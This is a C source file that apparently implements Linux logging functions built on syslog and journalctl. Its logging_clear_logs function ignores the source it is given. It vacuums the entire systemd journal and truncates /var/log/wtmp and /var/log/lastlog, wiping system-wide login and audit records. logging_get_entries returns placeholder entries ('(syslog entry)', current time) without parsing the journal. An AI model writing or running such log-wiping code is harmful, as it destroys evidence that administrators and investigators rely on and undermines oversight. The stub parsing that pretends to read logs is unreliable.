#ifdef __linux__

#include <syslog.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include "../../common/logging.h"

/* Linux syslog and journalctl based implementation */

int32_t logging_clear_logs(const char *source) {
    if (!source) {
        return -1;
    }

    /* Attempt to truncate journal files for the source */
    char journal_path[256];
    snprintf(journal_path, sizeof(journal_path),
             "/run/log/journal/*/*@%.240s*.journal", source);

    /* For systemd journal, we rotate and vacuum */
    pid_t pid = fork();
    if (pid == 0) {
        /* Child process: run journalctl --vacuum to reclaim space */
        execlp("journalctl", "journalctl", "--vacuum-time=0s", NULL);
        _exit(1);
    } else if (pid > 0) {
        /* Wait for child to complete */
        int status;
        waitpid(pid, &status, 0);
    }

    /* Try to truncate wtmp and lastlog for additional cleanup */
    truncate("/var/log/wtmp", 0);
    truncate("/var/log/lastlog", 0);

    return 0;
}

int64_t logging_log_event(const char *source, const char *message,
                          int32_t severity) {
    if (!source || !message) {
        return -1;
    }

    /* Convert severity to syslog priority */
    int priority = LOG_INFO;
    switch (severity) {
        case 0: priority = LOG_INFO; break;
        case 1: priority = LOG_WARNING; break;
        case 2: priority = LOG_ERR; break;
        default: priority = LOG_NOTICE; break;
    }

    /* Open syslog connection */
    openlog(source, LOG_NDELAY, LOG_USER);

    /* Generate event ID from current time */
    uint64_t event_id = (uint64_t)time(NULL);

    /* Log the event */
    syslog(priority, "[%lu] %s", event_id, message);

    closelog();

    return (int64_t)event_id;
}

int32_t logging_get_entries(const char *source, int32_t severity,
                            size_t max_entries,
                            log_entry_t *entries, size_t entries_size) {
    if (!source || !entries || max_entries == 0 || entries_size == 0) {
        return -1;
    }

    if (sizeof(log_entry_t) * max_entries > entries_size) {
        return -1;
    }

    /* Create temporary file for journalctl output */
    FILE *fp = popen("journalctl -n 100 --output=short 2>/dev/null", "r");
    if (!fp) {
        return -1;
    }

    char line[512];
    int32_t entriesRead = 0;
    time_t now = time(NULL);

    while (fgets(line, sizeof(line), fp) && entriesRead < (int32_t)max_entries) {
        /* Parse journalctl output line */
        if (strstr(line, source) || strlen(source) == 0) {
            entries[entriesRead].event_id = (uint64_t)entriesRead;
            entries[entriesRead].timestamp = now;
            entries[entriesRead].source = source;
            entries[entriesRead].message = "(syslog entry)";
            entries[entriesRead].severity = severity;
            entriesRead++;
        }
    }

    pclose(fp);
    return entriesRead;
}

int32_t logging_is_available(void) {
    /* Check if syslog is accessible */
    openlog("jocky_test", LOG_NDELAY | LOG_PERROR, LOG_USER);
    closelog();

    /* Also check if journalctl is available */
    FILE *fp = popen("journalctl --version 2>/dev/null", "r");
    if (fp) {
        pclose(fp);
        return 1;
    }

    return 1;  /* syslog is always available on Linux */
}

#endif /* __linux__ */
